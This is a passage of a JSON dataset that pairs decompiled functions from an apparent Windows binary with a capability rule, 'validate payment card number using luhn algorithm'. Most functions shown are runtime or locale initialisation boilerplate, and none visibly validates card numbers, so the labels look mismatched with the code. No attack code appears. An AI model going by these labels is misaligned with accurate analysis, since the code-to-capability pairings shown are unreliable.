fcn.1400a3cb0(arg1, *0x140110140, 0x140107c00);\n    *0x140107a28 = 1;\n    *0x140107a20 = *0x140110350 + 0x10;\n    *0x140107a30 = fcn.1400a5680();\n    fcn.1400a3cb0(arg1, *0x14010ffe0, 0x140107a20);\n    *0x1401070a8 = 1;\n    *0x1401070a0 = *0x1401105f0 + 0x10;\n    *0x1401070c0 = 0;\n    *0x1401070b0 = 0;\n    *0x140106b00 = *0x140110310 + 0x10;\n    *0x1401070b8 = 0;\n    *0x1401070c1 = 0;\n    *0x1401070c8 = 0;\n    *0x1401070d0 = 0;\n    *0x1401070d8 = 0;\n    *0x1401070e0 = 0;\n    *0x1401070e8 = 0;\n    *0x1401070f0 = 0;\n    *0x1401070f8 = 0;\n    *0x1401070fc = 0;\n    *0x14010710f = 0;\n    *0x140106b08 = 1;\n    *0x140106b10 = 0x1401070a0;\n    fcn.1400a5bf0(0x140106b00);\n    fcn.1400a3cb0(arg1, *0x14010ffa0, 0x140106b00);\n    *0x140107128 = 1;\n    *0x140107120 = *0x140110600 + 0x10;\n    *0x140107140 = 0;\n    *0x140107130 = 0;\n    *0x140106b20 = *0x140110320 + 0x10;\n    *0x140107138 = 0;\n    *0x140107141 = 0;\n    *0x140107148 = 0;\n    *0x140107150 = 0;\n    *0x140107158 = 0;\n    *0x140107160 = 0;\n    *0x140107168 = 0;\n    *0x140107170 = 0;\n    *0x140107178 = 0;\n    *0x14010717c = 0;\n    *0x14010718f = 0;\n    *0x140106b28 = 1;\n    *0x140106b30 = 0x140107120;\n    fcn.1400a5fb0(0x140106b20);\n    fcn.1400a3cb0(arg1, *0x14010ffb0, 0x140106b20);\n    *0x1401069e8 = 1;\n    *0x1401069e0 = *0x1401103b0 + 0x10;\n    fcn.1400a3cb0(arg1, *0x140110060, 0x1401069e0);\n    *0x140106a08 = 1;\n    *0x140106a00 = *0x1401103d0 + 0x10;\n    fcn.1400a3cb0(arg1, *0x140110080, 0x140106a00);\n    *0x140106d68 = 1;\n    *0x140106d60 = *0x1401105d0 + 0x10;\n    *0x140106ee8 = 0;\n    *0x140106ee0 = 0;\n    *0x140106d70 = 0;\n    *0x140106d74 = 0;\n    *0x140106d78 = 0;\n    *0x140106d7c = 0;\n    *0x140106d80 = 0;\n    *0x140106d84 = 0;\n    *0x140106d88 = 0;\n    *0x140106d8c = 0;\n    *0x140106d90 = 0;\n    *0x140106d94 = 0;\n    *0x140106d98 = 0;\n    *0x140106d9c = 0;\n    *0x140106da0 = 0;\n    *0x140106da4 = 0;\n    *0x140106da8 = 0;\n    *0x140106dac = 0;\n    *0x140106db0 = 0;\n    *0x140106db4 = 0;\n    *0x140106db8 = 0;\n    *0x140106dbc = 0;\n    *0x140106dc0 = 0;\n    *0x140106dc4 = 0;\n    *0x140106dc8 = 0;\n    *0x140106dcc = 0;\n    *0x140106dd0 = 0;\n    *0x140106dd4 = 0;\n    *0x140106dd8 = 0;\n    *0x140106ddc = 0;\n    *0x140106de0 = 0;\n    *0x140106de4 = 0;\n    *0x140106de8 = 0;\n    *0x140106dec = 0;\n    *0x140106df0 = 0;\n    *0x140106df4 = 0;\n    *0x140106df8 = 0;\n    *0x140106dfc = 0;\n    *0x140106e00 = 0;\n    *0x140106e04 = 0;\n    *0x140106e08 = 0;\n    *0x140106e0c = 0;\n    *0x140106e10 = 0;\n    *0x140106e14 = 0;\n    *0x140106e18 = 0;\n    *0x140106e1c = 0;\n    *0x140106e20 = 0;\n    *0x140106e24 = 0;\n    *0x140106e28 = 0;\n    *0x140106e2c = 0;\n    *0x140106e30 = 0;\n    *0x140106e34 = 0;\n    *0x140106e38 = 0;\n    *0x140106e3c = 0;\n    *0x140106e40 = 0;\n    *0x140106e44 = 0;\n    *0x140106e48 = 0;\n    *0x140106e4c = 0;\n    *0x140106e50 = 0;\n    *0x140106e54 = 0;\n    *0x140106e58 = 0;\n    *0x140106e5c = 0;\n    *0x140106e60 = 0;\n    *0x140106e64 = 0;\n    *0x140106e68 = 0;\n    *0x140106e6c = 0;\n    *0x140106e70 = 0;\n    *0x140106e74 = 0;\n    *0x140106e78 = 0;\n    *0x140106e7c = 0;\n    *0x140106e80 = 0;\n    *0x140106e84 = 0;\n    *0x140106e88 = 0;\n    *0x140106e8c = 0;\n    *0x140106e90 = 0;\n    *0x140106e94 = 0;\n    *0x140106e98 = 0;\n    *0x140106e9c = 0;\n    *0x140106ea0 = 0;\n    *0x140106ea4 = 0;\n    *0x140106ea8 = 0;\n    *0x140106eac = 0;\n    *0x140106eb0 = 0;\n    *0x140106eb4 = 0;\n    *0x140106eb8 = 0;\n    *0x140106ebc = 0;\n    *0x140106ec0 = 0;\n    *0x140106ec4 = 0;\n    *0x140106ec8 = 0;\n    *0x140106ecc = 0;\n    *0x140106ed0 = 0;\n    *0x140106ed4 = 0;\n    *0x140106ed8 = 0;\n    *0x140106edc = 0;\n    fcn.14007ff20(0x140106a20, 0x140106d60, 1);\n    fcn.1400a3cb0(arg1, *0x14010fe40, 0x140106a20);\n    *0x140106988 = 1;\n    *0x140106980 = *0x140110390 + 0x10;\n    fcn.1400a3cb0(arg1, *0x140110040, 0x140106980);\n    *0x1401069a8 = 1;\n    *0x1401069a0 = *0x140110770 + 0x10;\n    fcn.1400a3cb0(arg1, *0x1401101f0, 0x1401069a0);\n    fcn.1400b0d90(0x140106900, 1);\n    fcn.1400a3cb0(arg1, *0x140110000, 0x140106900);\n    fcn.1400a28f0(0x140107520, 1);\n    fcn.1400a3cb0(arg1, *0x14010ff40, 0x140107520);\n    fcn.1400b1e40(0x140107a00, 1);\n    fcn.1400a3cb0(arg1, *0x1401100f0, 0x140107a00);\n    *0x140106c88 = 1;\n    *0x140106c80 = *0x1401105b0 + 0x10;\n    *0x140106ca0 = 0;\n    *0x140106c90 = 0;\n    *0x140106960 = *0x140110380 + 0x10;\n    *0x140106c98 = 0;\n    *0x140106ca8 = 0;\n    *0x140106cb0 = 0;\n    *0x140106cb8 = 0;\n    *0x140106cc0 = 0;\n    *0x140106cc8 = 0;\n    *0x140106d48 = 0;\n    *0x140106968 = 1;\n    *0x140106970 = 0x140106c80;\n    fcn.1400b1490(0x140106960);\n    fcn.1400a3cb0(arg1, *0x140110030, 0x140106960);\n    *0x140107bf8 = 1;\n    *0x140107bf0 = *0x1401106f0 + 0x10;\n    fcn.1400a3cb0(arg1, *0x140110130, 0x140107bf0);\n    *0x140107c18 = 1;\n    *0x140107c10 = *0x140110710 + 0x10;\n    fcn.1400a3cb0(arg1, *0x140110150, 0x140107c10);\n    *0x140107a48 = 1;\n    *0x140107a40 = *0x140110360 + 0x10;\n    *0x140107a50 = fcn.1400a5680();\n    auStack168 = CONCAT88(0x1401070a0, 0x140106be0);\n    auStack152 = CONCAT88(0x140106c80, 0x140107120);\n    auStack136 = CONCAT88(*0x14010a7f0, 0x1401071a0);\n    fcn.1400a3cb0(arg1, *0x14010fff0, 0x140107a40);\n    *0x1401071a8 = 1;\n    *0x1401071a0 = *0x140110610 + 0x10;\n    *0x1401071c0 = 0;\n    *0x1401071b0 = 0;\n    *0x140106b40 = *0x140110330 + 0x10;\n    *0x1401071b8 = 0;\n    *0x1401071c2 = 0;\n    *0x1401071c8 = 0;\n    *0x1401071d0 = 0;\n    *0x1401071d8 = 0;\n    *0x1401071e0 = 0;\n    *0x1401071e8 = 0;\n    *0x1401071f0 = 0;\n    *0x1401071f8 = 0;\n    *0x1401071fc = 0;\n    *0x14010721a = 0;\n    *0x140106b48 = 1;\n    *0x140106b50 = 0x1401071a0;\n    fcn.1400a6370(0x140106b40);\n    fcn.1400a3cb0(arg1, *0x14010ffc0, 0x140106b40);\n    *0x140107228 = 1;\n    *0x140107220 = *0x140110620 + 0x10;\n    *0x140107240 = 0;\n    *0x140107230 = 0;\n    *0x140106b60 = *0x140110340 + 0x10;\n    *0x140107238 = 0;\n    *0x140107242 = 0;\n    *0x140107248 = 0;\n    *0x140107250 = 0;\n    *0x140107258 = 0;\n    *0x140107260 = 0;\n    *0x140107268 = 0;\n    *0x140107270 = 0;\n    *0x140107278 = 0;\n    *0x14010727c = 0;\n    *0x14010729a = 0;\n    *0x140106b68 = 1;\n    *0x140106b70 = 0x140107220;\n    fcn.1400a6740(0x140106b60);\n    fcn.1400a3cb0(arg1, *0x14010ffd0, 0x140106b60);\n    *0x1401069f8 = 1;\n    *0x1401069f0 = *0x1401103c0 + 0x10;\n    fcn.1400a3cb0(arg1, *0x140110070, 0x1401069f0);\n    *0x140106a18 = 1;\n    *0x140106a10 = *0x1401103e0 + 0x10;\n    fcn.1400a3cb0(arg1, *0x140110090, 0x140106a10);\n    *0x140106f08 = 1;\n    *0x140106f00 = *0x1401105e0 + 0x10;\n    *0x140107088 = 0;\n    *0x140107080 = 0;\n    *0x140106f10 = 0;\n    *0x140106f14 = 0;\n    *0x140106f18 = 0;\n    *0x140106f1c = 0;\n    *0x140106f20 = 0;\n    *0x140106f24 = 0;\n    *0x140106f28 = 0;\n    *0x140106f2c = 0;\n    *0x140106f30 = 0;\n    *0x140106f34 = 0;\n    *0x140106f38 = 0;\n    *0x140106f3c = 0;\n    *0x140106f40 = 0;\n    *0x140106f44 = 0;\n    *0x140106f48 = 0;\n    *0x140106f4c = 0;\n    *0x140106f50 = 0;\n    *0x140106f54 = 0;\n    *0x140106f58 = 0;\n    *0x140106f5c = 0;\n    *0x140106f60 = 0;\n    *0x140106f64 = 0;\n    *0x140106f68 = 0;\n    *0x140106f6c = 0;\n    *0x140106f70 = 0;\n    *0x140106f74 = 0;\n    *0x140106f78 = 0;\n    *0x140106f7c = 0;\n    *0x140106f80 = 0;\n    *0x140106f84 = 0;\n    *0x140106f88 = 0;\n    *0x140106f8c = 0;\n    *0x140106f90 = 0;\n    *0x140106f94 = 0;\n    *0x140106f98 = 0;\n    *0x140106f9c = 0;\n    *0x140106fa0 = 0;\n    *0x140106fa4 = 0;\n    *0x140106fa8 = 0;\n    *0x140106fac = 0;\n    *0x140106fb0 = 0;\n    *0x140106fb4 = 0;\n    *0x140106fb8 = 0;\n    *0x140106fbc = 0;\n    *0x140106fc0 = 0;\n    *0x140106fc4 = 0;\n    *0x140106fc8 = 0;\n    *0x140106fcc = 0;\n    *0x140106fd0 = 0;\n    *0x140106fd4 = 0;\n    *0x140106fd8 = 0;\n    *0x140106fdc = 0;\n    *0x140106fe0 = 0;\n    *0x140106fe4 = 0;\n    *0x140106fe8 = 0;\n    *0x140106fec = 0;\n    *0x140106ff0 = 0;\n    *0x140106ff4 = 0;\n    *0x140106ff8 = 0;\n    *0x140106ffc = 0;\n    *0x140107000 = 0;\n    *0x140107004 = 0;\n    *0x140107008 = 0;\n    *0x14010700c = 0;\n    *0x140107010 = 0;\n    *0x140107014 = 0;\n    *0x140107018 = 0;\n    *0x14010701c = 0;\n    *0x140107020 = 0;\n    *0x140107024 = 0;\n    *0x140107028 = 0;\n    *0x14010702c = 0;\n    *0x140107030 = 0;\n    *0x140107034 = 0;\n    *0x140107038 = 0;\n    *0x14010703c = 0;\n    *0x140107040 = 0;\n    *0x140107044 = 0;\n    *0x140107048 = 0;\n    *0x14010704c = 0;\n    *0x140107050 = 0;\n    *0x140107054 = 0;\n    *0x140107058 = 0;\n    *0x14010705c = 0;\n    *0x140107060 = 0;\n    *0x140107064 = 0;\n    *0x140107068 = 0;\n    *0x14010706c = 0;\n    *0x140107070 = 0;\n    *0x140107074 = 0;\n    *0x140107078 = 0;\n    *0x14010707c = 0;\n    fcn.140080780(0x140106a60, 0x140106f00, 1);\n    fcn.1400a3cb0(arg1, *0x14010fe50, 0x140106a60);\n    *0x140106998 = 1;\n    *0x140106990 = *0x1401103a0 + 0x10;\n    fcn.1400a3cb0(arg1, *0x140110050, 0x140106990);\n    *0x1401069b8 = 1;\n    *0x1401069b0 = *0x140110780 + 0x10;\n    fcn.1400a3cb0(arg1, *0x140110200, 0x1401069b0);\n    fcn.1400b0f60(0x140106920, 1);\n    fcn.1400a3cb0(arg1, *0x140110010, 0x140106920);\n    *0x1401069c8 = 1;\n    *0x1401069c0 = *0x1401106b0 + 0x10;\n    fcn.1400a3cb0(arg1, *0x1401100d0, 0x1401069c0);\n    *0x1401069d8 = 1;\n    *0x1401069d0 = *0x140110690 + 0x10;\n    fcn.1400a3cb0(arg1, *0x1401100b0, 0x1401069d0);\n    *0x140106b88 = 1;\n    *0x140106b80 = *0x1401106a0 + 0x10;\n    fcn.1400a3cb0(arg1, *0x1401100c0, 0x140106b80);\n    *0x140106b98 = 1;\n    *0x140106b90 = *0x140110680 + 0x10;\n    fcn.1400a3cb0(arg1, *0x1401100a0, 0x140106b90);\n    fcn.1400a2b00(arg1, auStack168);\n    iVar5 = *(arg1 + 6);\n    iVar3 = fcn.14002c080(*0x140110020);\n    uVar1 = *0x14010ffa0;\n    *(iVar5 + iVar3 * 8) = 0x140106be0;\n    iVar5 = *(arg1 + 6);\n    iVar3 = fcn.14002c080(uVar1);\n    uVar1 = *0x14010ffb0;\n    *(iVar5 + iVar3 * 8) = 0x1401070a0;\n    iVar5 = *(arg1 + 6);\n    iVar3 = fcn.14002c080(uVar1);\n    uVar1 = *0x14010fe40;\n    *(iVar5 + iVar3 * 8) = 0x140107120;\n    iVar5 = *(arg1 + 6);\n    iVar3 = fcn.14002c080(uVar1);\n    uVar1 = *0x140110030;\n    *(iVar5 + iVar3 * 8) = 0x140106d60;\n    iVar5 = *(arg1 + 6);\n    iVar3 = fcn.14002c080(uVar1);\n    uVar1 = *0x14010ffc0;\n    *(iVar5 + iVar3 * 8) = 0x140106c80;\n    iVar5 = *(arg1 + 6);\n    iVar3 = fcn.14002c080(uVar1);\n    uVar1 = *0x14010ffd0;\n    *(iVar5 + iVar3 * 8) = 0x1401071a0;\n    iVar5 = *(arg1 + 6);\n    iVar4 = fcn.14002c080(uVar1);\n    uVar1 = *0x14010fe50;\n    iVar3 = *(arg1 + 6);\n    *(iVar5 + iVar4 * 8) = 0x140107220;\n    iVar5 = fcn.14002c080(uVar1);\n    *(iVar3 + iVar5 * 8) = 0x140106f00;\n    return;\n}\n",
        "token_count": 6499
    },
    "1400a568": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400a5680(void)\n\n{\n    if (**0x14010fc90 != 0) {\n        fcn.1400147f0(0x140108790, 0x1400a5740);\n        return *0x140108780;\n    }\n    if (*0x140108780 != 0) {\n        return *0x140108780;\n    }\n    fcn.1400a5710(0x140108780, 0x140110fb0);\n    return *0x140108780;\n}\n",
        "token_count": 123
    },
    "1400a5bf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a5bf0(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    \n    piVar5 = *(arg1 + 0x10);\n    if (piVar5 == NULL) {\n        piVar5 = fcn.1400bc710(0x70);\n        iVar2 = *0x1401105f0;\n        *(piVar5 + 1) = 0;\n        piVar5[2] = 0;\n        *piVar5 = iVar2 + 0x10;\n        piVar5[3] = 0;\n        *(piVar5 + 4) = 0;\n        *(piVar5 + 0x21) = 0;\n        piVar5[5] = 0;\n        piVar5[6] = 0;\n        piVar5[7] = 0;\n        piVar5[8] = 0;\n        piVar5[9] = 0;\n        piVar5[10] = 0;\n        *(piVar5 + 0xb) = 0;\n        *(piVar5 + 0x5c) = 0;\n        *(piVar5 + 0x6f) = 0;\n        *(arg1 + 0x10) = piVar5;\n    }\n    *(piVar5 + 0x21) = 0x2e;\n    *(*(arg1 + 0x10) + 0x22) = 0x2c;\n    iVar2 = *(arg1 + 0x10);\n    *(iVar2 + 0x10) = 0x14010a800;\n    *(iVar2 + 0x28) = 0x14010a800;\n    *(iVar2 + 0x38) = 0x14010a800;\n    *(iVar2 + 0x48) = 0x14010a800;\n    puVar3 = *0x14010fde0;\n    *(iVar2 + 0x18) = 0;\n    uVar1 = *puVar3;\n    *(iVar2 + 0x30) = 0;\n    *(iVar2 + 0x40) = 0;\n    *(iVar2 + 0x50) = 0;\n    *(iVar2 + 0x58) = 0;\n    *(iVar2 + 0x5c) = uVar1;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = **0x14010fdf0;\n    iVar4 = 0;\n    do {\n        *(*(arg1 + 0x10) + 100 + iVar4) = *(iVar2 + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0xb);\n    return;\n}\n",
        "token_count": 651
    },
    "1400a5fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a5fb0(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    \n    piVar5 = *(arg1 + 0x10);\n    if (piVar5 == NULL) {\n        piVar5 = fcn.1400bc710(0x70);\n        iVar2 = *0x140110600;\n        *(piVar5 + 1) = 0;\n        piVar5[2] = 0;\n        *piVar5 = iVar2 + 0x10;\n        piVar5[3] = 0;\n        *(piVar5 + 4) = 0;\n        *(piVar5 + 0x21) = 0;\n        piVar5[5] = 0;\n        piVar5[6] = 0;\n        piVar5[7] = 0;\n        piVar5[8] = 0;\n        piVar5[9] = 0;\n        piVar5[10] = 0;\n        *(piVar5 + 0xb) = 0;\n        *(piVar5 + 0x5c) = 0;\n        *(piVar5 + 0x6f) = 0;\n        *(arg1 + 0x10) = piVar5;\n    }\n    *(piVar5 + 0x21) = 0x2e;\n    *(*(arg1 + 0x10) + 0x22) = 0x2c;\n    iVar2 = *(arg1 + 0x10);\n    *(iVar2 + 0x10) = 0x14010a800;\n    *(iVar2 + 0x28) = 0x14010a800;\n    *(iVar2 + 0x38) = 0x14010a800;\n    *(iVar2 + 0x48) = 0x14010a800;\n    puVar3 = *0x14010fde0;\n    *(iVar2 + 0x18) = 0;\n    uVar1 = *puVar3;\n    *(iVar2 + 0x30) = 0;\n    *(iVar2 + 0x40) = 0;\n    *(iVar2 + 0x50) = 0;\n    *(iVar2 + 0x58) = 0;\n    *(iVar2 + 0x5c) = uVar1;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = **0x14010fdf0;\n    iVar4 = 0;\n    do {\n        *(*(arg1 + 0x10) + 100 + iVar4) = *(iVar2 + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0xb);\n    return;\n}\n",
        "token_count": 649
    },
    "1400a637": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a6370(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    \n    piVar6 = *(arg1 + 0x10);\n    if (piVar6 == NULL) {\n        piVar6 = fcn.1400bc710(0x80);\n        iVar2 = *0x140110610;\n        *(piVar6 + 1) = 0;\n        piVar6[2] = 0;\n        *piVar6 = iVar2 + 0x10;\n        piVar6[3] = 0;\n        *(piVar6 + 4) = 0;\n        *(piVar6 + 0x22) = 0;\n        piVar6[5] = 0;\n        piVar6[6] = 0;\n        piVar6[7] = 0;\n        piVar6[8] = 0;\n        piVar6[9] = 0;\n        piVar6[10] = 0;\n        *(piVar6 + 0xb) = 0;\n        *(piVar6 + 0x5c) = 0;\n        *(piVar6 + 0x7a) = 0;\n        *(arg1 + 0x10) = piVar6;\n    }\n    uVar1 = *0x14010a804;\n    piVar6[3] = 0;\n    piVar6[2] = 0x14010a800;\n    *(piVar6 + 0x22) = uVar1;\n    piVar6[5] = 0x14010a802;\n    piVar6[7] = 0x14010a802;\n    piVar6[9] = 0x14010a802;\n    puVar4 = *0x14010fde0;\n    piVar6[6] = 0;\n    uVar1 = *puVar4;\n    piVar6[8] = 0;\n    piVar6[10] = 0;\n    *(piVar6 + 0x5c) = uVar1;\n    *(piVar6 + 0xb) = 0;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = *(arg1 + 0x10);\n    iVar3 = **0x14010fdf0;\n    iVar5 = 0;\n    do {\n        *(iVar2 + 100 + iVar5 * 2) = *(iVar3 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0xb);\n    return;\n}\n",
        "token_count": 615
    },
    "1400a674": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a6740(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    \n    piVar6 = *(arg1 + 0x10);\n    if (piVar6 == NULL) {\n        piVar6 = fcn.1400bc710(0x80);\n        iVar2 = *0x140110620;\n        *(piVar6 + 1) = 0;\n        piVar6[2] = 0;\n        *piVar6 = iVar2 + 0x10;\n        piVar6[3] = 0;\n        *(piVar6 + 4) = 0;\n        *(piVar6 + 0x22) = 0;\n        piVar6[5] = 0;\n        piVar6[6] = 0;\n        piVar6[7] = 0;\n        piVar6[8] = 0;\n        piVar6[9] = 0;\n        piVar6[10] = 0;\n        *(piVar6 + 0xb) = 0;\n        *(piVar6 + 0x5c) = 0;\n        *(piVar6 + 0x7a) = 0;\n        *(arg1 + 0x10) = piVar6;\n    }\n    uVar1 = *0x14010a804;\n    piVar6[3] = 0;\n    piVar6[2] = 0x14010a800;\n    *(piVar6 + 0x22) = uVar1;\n    piVar6[5] = 0x14010a802;\n    piVar6[7] = 0x14010a802;\n    piVar6[9] = 0x14010a802;\n    puVar4 = *0x14010fde0;\n    piVar6[6] = 0;\n    uVar1 = *puVar4;\n    piVar6[8] = 0;\n    piVar6[10] = 0;\n    *(piVar6 + 0x5c) = uVar1;\n    *(piVar6 + 0xb) = 0;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = *(arg1 + 0x10);\n    iVar3 = **0x14010fdf0;\n    iVar5 = 0;\n    do {\n        *(iVar2 + 100 + iVar5 * 2) = *(iVar3 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0xb);\n    return;\n}\n",
        "token_count": 615
    },
    "1400a6b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a6b20(int64_t *arg1)\n\n{\n    if (*arg1 != arg1 + 2) {\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)(*arg1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "1400a6e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a6e90(ulong arg1)\n\n{\n    ulong var_10h;\n    \n    fcn.1400722a0(arg1);\n    return;\n}\n",
        "token_count": 41
    },
    "1400a9dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a9dd0(ulong param_1, int64_t param_2, int64_t param_3)\n\n{\n    ulong uVar1;\n    int64_t *piVar2;\n    ulong uStack72;\n    uint64_t uStack64;\n    int64_t *piStack56;\n    \n    piVar2 = 0x14010b1a0;\n    fcn.1400bd270(0x14010b1a0);\n    *piVar2 = piVar2 + 2;\n    if ((param_2 == 0) && (param_3 != 0)) {\n        piVar2 = 0x14010bc68;\n        fcn.1400bd270(0x14010bc68);\n        piVar2[1] = 0;\n        *piVar2 = piVar2 + 2;\n        *(piVar2 + 2) = 0;\n        return;\n    }\n    uStack64 = fcn.1400b8050(param_2, param_3 + param_2);\n    if (uStack64 < 0x10) {\n        piStack56 = piVar2;\n        fcn.1400a75f0(piVar2);\n    }\n    else {\n        uVar1 = fcn.1400a9310(piVar2, &uStack64, 0);\n        fcn.1400a86c0(piVar2, uVar1);\n        fcn.1400a6e40(piVar2, uStack64);\n    }\n    fcn.1400bc660(&uStack72, piVar2);\n    uVar1 = fcn.14002fcc0(piVar2);\n    fcn.1400a7650(uVar1, param_2, param_3 + param_2);\n    uStack72 = 0;\n    fcn.1400a7600(piVar2, uStack64);\n    fcn.1400bc680(&uStack72);\n    return;\n}\n",
        "token_count": 437
    },
    "1400aa2e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400aa2e0(int64_t *arg1)\n\n{\n    if (*arg1 != arg1 + 2) {\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)(*arg1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "1400aa3f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400aa3f0(int64_t arg1, ulong s)\n\n{\n    sub.msvcrt.dll_strlen(s);\n    fcn.1400a6b40(arg1, 0, *(arg1 + 8), s);\n    return;\n}\n",
        "token_count": 59
    },
    "1400aa4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400aa4b0(int64_t *arg1, int64_t arg2)\n\n{\n    return *arg1 + arg2;\n}\n",
        "token_count": 37
    },
    "1400b0b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b0b60(char **arg1)\n\n{\n    *arg1 = \"0\\v\\v@\\x01\";\n    fcn.1400a5760(arg1 + 2);\n    return;\n}\n",
        "token_count": 49
    },
    "1400b0d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b0d10(ulong *arg1)\n\n{\n    *arg1 = 0x1401173a0;\n    fcn.1400a5760(arg1 + 2);\n    return;\n}\n",
        "token_count": 51
    },
    "1400b0d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b0d90(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x1401173e0;\n    uVar1 = fcn.1400a5680();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "1400b0e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b0e30(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x1401173e0;\n    uVar1 = fcn.1400a5680();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "1400b0f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b0f60(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x140117420;\n    uVar1 = fcn.1400a5680();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 87
    },
    "1400b100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b1000(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x140117420;\n    uVar1 = fcn.1400a5680();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 86
    },
    "1400b10e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b10e0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    \n    piVar3 = *(arg1 + 0x10);\n    if (piVar3 == NULL) {\n        piVar3 = fcn.1400bc710(0x90);\n        iVar1 = *0x1401105a0;\n        *(piVar3 + 1) = 0;\n        piVar3[2] = 0;\n        *piVar3 = iVar1 + 0x10;\n        piVar3[3] = 0;\n        *(piVar3 + 4) = 0;\n        piVar3[5] = 0;\n        piVar3[6] = 0;\n        piVar3[7] = 0;\n        piVar3[8] = 0;\n        *(piVar3 + 9) = 0;\n        *(piVar3 + 0x11) = 0;\n        *(arg1 + 0x10) = piVar3;\n    }\n    piVar3[3] = 0;\n    piVar3[2] = 0x14010a820;\n    *(piVar3 + 4) = 0;\n    *(piVar3 + 9) = 0x2e;\n    *(*(arg1 + 0x10) + 0x49) = 0x2c;\n    iVar1 = **0x14010fdc0;\n    iVar2 = 0;\n    do {\n        *(*(arg1 + 0x10) + 0x4a + iVar2) = *(iVar1 + iVar2);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x24);\n    iVar1 = **0x14010fdb0;\n    iVar2 = 0;\n    do {\n        *(*(arg1 + 0x10) + 0x6e + iVar2) = *(iVar1 + iVar2);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x1a);\n    